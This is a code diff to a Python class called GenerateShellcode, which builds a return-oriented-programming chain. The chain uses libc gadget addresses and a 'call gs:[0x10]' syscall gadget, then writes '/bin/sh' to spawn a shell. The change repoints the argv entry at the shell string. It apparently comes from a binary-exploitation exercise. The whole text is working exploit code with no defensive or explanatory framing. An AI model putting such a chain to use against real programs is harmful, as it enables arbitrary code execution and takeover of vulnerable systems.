@@ -65,7 +65,7 @@ class GenerateShellcode:
         self.store_word(shell_addr - 0x4)   # Point to address of the envp array
 
         self.store_libc_word(0xb1265)       # call dword ptr gs:[0x10] ; ret ;
-        self.store_word(shell_addr - 0x4)   # Point to 0xdecafbad
+        self.store_word(shell_addr)         # Point to the shell
         self.store_word(0xdecafbad)         # Temporary value that will get replaced with 0 by the 0xb7e34ca3 gadget
         self.store_str("/bin")
         self.store_str("/sh\0")
@@ -91,7 +91,7 @@ class GenerateShellcode:
         self.store_word(shell_addr - 0x4)   # Point to address of the envp array
 
         self.store_gadget("call dword ptr gs:[0x10] ; ret ;")
-        self.store_word(shell_addr - 0x4)   # Point to 0xdecafbad
+        self.store_word(shell_addr)         # Point to the shell
         self.store_word(0xdecafbad)         # Temporary value that will get replaced with 0 by the 0xb7e34ca3 gadget
         self.store_str("/bin")
         self.store_str("/sh\0")
